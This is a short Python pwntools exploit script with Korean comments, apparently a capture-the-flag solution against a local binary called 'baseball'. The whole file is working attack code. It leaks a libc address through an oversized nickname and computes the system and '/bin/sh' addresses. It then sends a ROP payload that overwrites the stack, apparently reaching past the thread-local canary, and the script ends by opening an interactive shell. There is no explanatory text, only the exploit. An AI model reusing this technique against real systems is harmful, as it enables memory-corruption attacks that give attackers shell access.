from pwn import *

# 바이너리 및 context 설정
p = process("./baseball")
libc = ELF('./libc.so.6')  
elf = ELF('./baseball')


# canary_offset = 0x928  # TLS 카나리까지의 오프셋

for k in range(10):
   for i in range(4):
      p.sendlineafter("(3 digits, each from 1 to 9):",b'1 2 3')
   p.sendafter("Enter your nickname: ",b'a'*0xdf+b'g')
   p.recvuntil('g')
   start_thread=u64(p.recvn(6)+b'\x00\x00')
   p.sendlineafter("(yes/no):",b'yes')
print(hex(start_thread))

system=start_thread-0x43a60
binsh=start_thread+0x143ea8
ret=0x000000000040101a
pop_rdi = 0x00000000004013b3 # pop rdi; ret 가젯 주소 설정

payload = b'\x00' * 0x110 + p64(0x404500)
payload += p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system) 
payload += b'\x00' * (0x910-len(payload)) + p64(0x404800 - 0x972)
payload += b'\x00' * 0x28 

for i in range(4):
   p.sendlineafter("(3 digits, each from 1 to 9):",b'1 2 3')
p.sendafter("Enter your nickname: ",payload)

# 쉘 상호작용 모드로 전환
p.interactive()
